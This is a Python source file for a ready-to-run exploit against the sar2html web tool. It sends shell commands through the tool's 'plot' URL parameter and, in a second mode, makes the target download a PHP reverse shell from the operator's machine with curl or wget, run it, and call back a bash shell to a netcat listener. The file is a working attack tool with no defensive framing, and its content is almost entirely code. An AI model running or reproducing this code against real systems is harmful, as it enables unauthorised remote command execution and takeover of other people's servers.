from argparse import ArgumentParser
from requests import get
from bs4 import BeautifulSoup as bs
from urllib3 import disable_warnings, exceptions
from os import remove, system
from time import sleep
from subprocess import Popen

disable_warnings(exceptions.InsecureRequestWarning) 

def arguments():
    
    parser = ArgumentParser(description="Exploit [sar2html] Vulnerability", epilog="./app.py http://IP:80 --command ls")
    parser.add_argument("url", metavar="<URL>", type=str, help="PATH to sar2html base (URL location)")
    parser.add_argument("--command", metavar="", type=str, help='Manual Command injection! [for complex commands => "<command>"]')
    parser.add_argument("--shell_mode", action='store_true', help="Reverse_shell mode => [upload rev_shell]")
    args = parser.parse_args()

    return args.url, args.command, args.shell_mode


def logo():

    logo = "\n _____            _____  _   _ ________  ___ _          _____           _       _ _   \n"
    logo += "/  ___|          / __  \| | | |_   _|  \/  || |        |  ___|         | |     (_) |  \n"
    logo += "\ `--.  __ _ _ __`' / /'| |_| | | | | .  . || |  ______| |____  ___ __ | | ___  _| |_ \n"
    logo += " `--. \/ _` | '__| / /  |  _  | | | | |\/| || | |______|  __\ \/ / '_ \| |/ _ \| | __|\n"
    logo += "/\__/ / (_| | |  ./ /___| | | | | | | |  | || |____    | |___>  <| |_) | | (_) | | |_ \n"
    logo += "\____/ \__,_|_|  \_____/\_| |_/ \_/ \_|  |_/\_____/    \____/_/\_\ .__/|_|\___/|_|\__|\n"
    logo += "                                                                 | |                  \n"
    logo += "                                                                 |_|                  "

    return logo


def start_handler(LHOST, LPORT):

    payload_file = f"""<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/{LHOST}/{LPORT} 0>&1'");?>""" 
    file = open("shell.php", "w")
    file.write(payload_file)
    file.close()
    
    print("\n[+] Creating process...")
    system("nohup python3 -m http.server 8000 </dev/null >/dev/null 2>&1 &")
    print("\n---> Server started http://%s:%s" % ("127.0.0.1", "8000"))
    Popen(["nc", "-lp", f"{LPORT}"])
    print(f"---> Listening on port {LPORT}\n")
    sleep(2)


class sar2html_exploit:

    results = []
    irrelevant = ["Select Host", "HPUX", "Linux", "There is no defined host...", "SunOS"]

    def shell_upload(self, target, LHOST, LPORT): 

        start_handler(LHOST, LPORT)

        curl_injection = target + f"?plot=;curl http://{LHOST}:8000/shell.php -o shell.php"
        wget_injection =  target + f"?plot=;wget http://{LHOST}:8000/shell.php" 

        curl_response = bs(get(url=target + "?plot=;whereis -b curl").content, "html.parser") 
        wget_response = bs(get(url=target + "?plot=;whereis -b wget").content, "html.parser") 
        Filter_curl = curl_response.select_one('select[class="select_text"]').select("option") 
        Filter_wget = wget_response.select_one('select[class="select_text"]').select("option")

        for output1 in Filter_curl:
            for output2 in Filter_wget:

                if output1.get_text() in self.irrelevant or output2.get_text() in self.irrelevant:
                    pass
                else:
                    self.results.append(output1.get_text())
                    self.results.append(output2.get_text())

        if "curl: /usr/bin/curl" in self.results[0] or "curl: /usr/bin/curl /usr/include/curl" in self.results[0]:
            
            print("[!] SHELL upload is possible in the target!\n")
            
            get(url=curl_injection)
            print("Spawning your shell :)\n")
            get(url=target + "?plot=;php shell.php") 
            remove("shell.php")

        elif "wget: /usr/bin/wget" in self.results[0]:
        
            print("[-] Curl is not enabled in the target system. Trying WGET...\n")
            print("[!] SHELL upload is possible in the target!\n")
            
            get(url=wget_injection)
            print("Spawning your shell! :)\n")
            get(url=target + "?plot=;php shell.php")
            remove("shell.php")
        else:
            print("[X] Shell can't be uploaded :(\n")


    def exploit(self, target, command):

        try:
            exploit = get(url=target + f"?plot=;{command}") 
            HTML_page = bs(exploit.content, "html.parser")
            Filter = HTML_page.select_one('select[class="select_text"]').select("option") 
            
            for output in Filter:
                if output.get_text() in self.irrelevant:
                    pass
                else:
                    self.results.append(output.get_text()) 

            print("\n[+] Got results!")
            print("\n" + "---" * 15 + "OUTPUT" + '---' * 15 + "\n")
            [print(i) for i in self.results]
            print("\n" + "---" * 15 + "OUTPUT" + '---' * 15 + "\n")

        except AttributeError:
            print("[X] Sar2html base not found! Are you sure this is the right path?\n")
        except TimeoutError:
            print("[X] TIMEOUT! Try again!\n")
    

def main():

    url, command, shell_mode = arguments()
    run = sar2html_exploit()

    if url is not None:

        print(logo())

        if get(url=url).status_code == 200:

            if command is not None and shell_mode is False:
                
                print("\n[+] URL found! Starting command injection...")
                run.exploit(target=url, command=command)
            else:
                print("\n[+] URL found! Starting shell upload...")
                print("---" * 10)
                lhost = input("LHOST= ")
                lport = input("LPORT= ")
                print("---" * 10)

                run.shell_upload(target=url, LHOST=lhost, LPORT=lport)
            
            return "\n[âœ“] Done\n"
        else:
            return "\n[X] URL not found! :("
    else:
        return "\n[X] URL Path to the target must be provided!\n"


if __name__ == '__main__':

    print(main())
